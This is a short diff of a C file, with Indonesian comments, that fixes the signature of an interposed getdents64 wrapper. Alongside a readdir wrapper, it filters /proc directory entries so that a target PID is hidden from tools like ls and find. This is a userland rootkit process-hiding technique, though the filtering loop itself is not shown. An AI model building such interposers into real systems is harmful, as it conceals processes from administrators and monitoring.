@@ -79,13 +79,13 @@ struct dirent* readdir(DIR* dirp) {
 }
 
 /* ==== Interposisi getdents64 (dipakai ls /proc, find, ...) ==== */
-/* Signature harus identik dengan deklarasi glibc di <dirent.h>:
- * int getdents64(int fd, void *dirp, size_t count) */
-int getdents64(int fd, void* dirp, size_t count) {
-    static int (*real_getdents64)(int, void*, size_t) = NULL;
+/* Signature harus identik dengan glibc (bits/dirent_ext.h):
+ * extern __ssize_t getdents64(int fd, void *buffer, size_t length) */
+ssize_t getdents64(int fd, void* dirp, size_t count) {
+    static ssize_t (*real_getdents64)(int, void*, size_t) = NULL;
     if (!real_getdents64) real_getdents64 = dlsym(RTLD_NEXT, "getdents64");
 
-    int n = real_getdents64(fd, dirp, count);
+    ssize_t n = real_getdents64(fd, dirp, count);
     if (n <= 0 || !fd_is_proc(fd)) return n;
 
     /* Padatkan buffer: buang entry milik PID target. */
